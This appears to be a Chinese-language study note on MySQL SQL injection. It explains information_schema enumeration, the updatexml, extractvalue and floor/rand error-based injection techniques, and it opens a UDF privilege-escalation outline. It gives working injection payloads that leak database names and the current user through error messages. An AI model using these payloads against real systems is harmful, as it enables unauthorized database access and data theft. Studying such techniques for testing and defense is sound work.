查询语句

SELECT table_name FROM information_schema.tables WHERE table_schema = database();

上面这个实例表示的实例是

information_schema是系统中包含所有信息的数据库

​ information_schema.tables 表示的是数据库里面所有的表

table_schema 他是information_schema.tables的一个列，他这个列包含的内容是所有的数据库名字，

table_schema = database()这个的意思是当前的数据库

综合的意思就是找当前数据库的所有表名

select group_concat(column_name) from information_schema.columns where table_name = “表名”

这个的意思是找所有的列名在某个表，然后group_concat是把他输出到一行，而不是一个一个输出

报错注入

updatexml

语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据

updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）

例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。

extractvalue

此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）

由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。

floor

限制条件5.0 , 5.1 , 5.5

这两个x是别名,a也是别名

rand()就是从0到1随机一个数

floor()就是向下取整

经过测试发现floor(rand(0)2))是一个伪随机数，开头是011011，所以concat(DATABASE(),floor(rand(0)*2) 会重复

这个时候漏洞就出现了

mysql官方注明，在执行group by语句的时候，group by语句后面的字段会被运算两次。

第一次是group by后面的字段和虚拟表进行对比，第二次是插入时会进行运算。

原理

1.floor(rand(0)*2)进行第一次运算，floor=0，此时为floor与虚拟表进行对比，由于表中没有值，进行插入。

2、插入时，floor进行第二次运算，floor=1，插入1，count=1。

3、取floor=1，此时为floor与虚拟表进行对比，由于存在floor=1，故count+1。

4、插入0时，floor进行第二次运算，floor=0已经存在，无法进行插入操作，故产生主键重复错误，抛出异常。

SELECT count(*), CONCAT(database(),FLOOR(RAND(0)*2))x group by x

那么上面这个就能够成功了，但是显然不是，因为这个只会返回一个数据，我要多次的插入才会报错，所以加上from information_schema.tables，select 1 from 会返回和数据一样多的1，

SELECT count(*), CONCAT(database(),FLOOR(RAND(0)*2))x from information_schema.tables group by x

ok这个时候成功一大半了，我们要让他执行就要加上 1=（SELECT count(*), CONCAT(database(),FLOOR(RAND(0)*2))x from information_schema.tables group by x）

但是这个不行，我们用select 1 from (SELECT count(*), CONCAT(database(),FLOOR(RAND(0)*2))x from information_schema.tables group by x)a ,记得加上a

在做多表查询，或者查询的时候产生新的表的时候会出现这个错误：Every derived table must have its own alias（每一个派生出来的表都必须有一个自己的别名）

udf提权

原理简介：

MySQL 支持通过 C/C++ 编写的 UDF 动态库（.dll 或 .so 文件），将其注册为数据库函数并使用。

如果你拥有：

  • 数据库的 FILE 权限（可写文件）；
  • 能将 恶意 UDF 动态库写入插件目录；
  • 或者绕过 secure_file_priv 写到任意路径；
  • 能执行 CREATE FUNCTION 注册函数；
